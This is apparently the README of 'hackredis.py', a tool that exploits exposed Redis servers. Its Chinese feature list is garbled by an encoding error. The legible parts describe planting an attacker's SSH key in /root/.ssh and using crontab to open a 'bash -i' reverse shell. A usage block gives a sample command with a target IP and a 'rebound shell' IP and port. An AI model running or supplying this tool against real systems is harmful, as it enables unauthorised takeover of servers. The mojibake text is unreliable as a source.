### 0x01 �ű�����
1. д��ssh��Կ
2. ����shell
3. ���û��.sshĿ¼����ubuntuϵͳ����crontab��ʱ�����½�/root/.sshĿ¼����д��Կ������shell
4. ���û��/root/.ssh/Ŀ¼���ýű���֧��ubuntuϵͳ�����Է���shellʹ����bash -i������Ҳ�޹ؽ�Ҫ

### 0x02 �ű��÷�

�ű��÷�
```
usage: hackredis.py [-h] [-t TARGET_IP] [-sp SSH_PORT] [-rsi REBOUND_SHELL_IP]
                    [-rsp REBOUND_SHELL_PORT] [-pubkey SSH_PUBLIC_KEYFILE]
                    [-prikey SSH_PRIVATE_KEYFILE]

For Example:
-----------------------------------------------------------------------------
python hackredis.py -t 123.56.11.22 -sp 22 -rsi x.x.x.x -rsp 5555 -pubkey
ssh_public_key -prikey ssh_private_key

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET_IP          target ip
  -sp SSH_PORT          ssh port to login ssh
  -rsi REBOUND_SHELL_IP
                        rebound shell ip
  -rsp REBOUND_SHELL_PORT
                        rebound shell port
  -pubkey SSH_PUBLIC_KEYFILE
                        ssh public key file
  -prikey SSH_PRIVATE_KEYFILE
                        ssh private key file
```